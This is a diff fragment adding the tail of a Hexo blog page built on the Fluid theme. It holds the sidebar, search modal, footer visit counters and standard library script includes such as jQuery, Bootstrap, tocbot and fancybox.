+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
